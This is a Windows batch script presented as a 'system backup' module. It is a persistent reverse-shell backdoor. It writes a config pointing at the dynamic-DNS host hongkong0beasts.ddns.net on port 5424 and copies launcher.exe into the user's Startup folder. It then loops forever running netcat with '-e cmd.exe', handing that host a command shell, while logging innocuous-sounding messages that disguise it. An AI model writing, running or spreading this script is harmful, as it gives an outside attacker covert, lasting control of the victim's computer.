@echo off
set loop=0
COLOR 0a
TITLE=Main Module
echo [%time%] system_backup executed... >>log.dat
START backup.exe
IF NOT EXIST "config.bat" GOTO makeconfig
:NEXT
	call config.bat
	echo [%time%] system executed >>log.dat
	IF NOT EXIST "%USERPROFILE%\Start Menu\Programs\Startup\launcher.exe" copy "launcher.exe" "%USERPROFILE%\Start Menu\Programs\Startup" && echo Copying
:loop
	set /a "loop=%loop% +1"
	nc %ip% %port% -v -v -v -v -e %prog%
	echo [%time%] system_error : connection_failed... >>log.dat
	ping localhost -n %timeout% >nul
	goto loop
:makeconfig
	echo set ip=hongkong0beasts.ddns.net >>config.bat
	echo set port=5424 >>config.bat
	echo set prog=cmd.exe >>config.bat
	echo set timeout=5 >>config.bat
	goto NEXT
:EOF
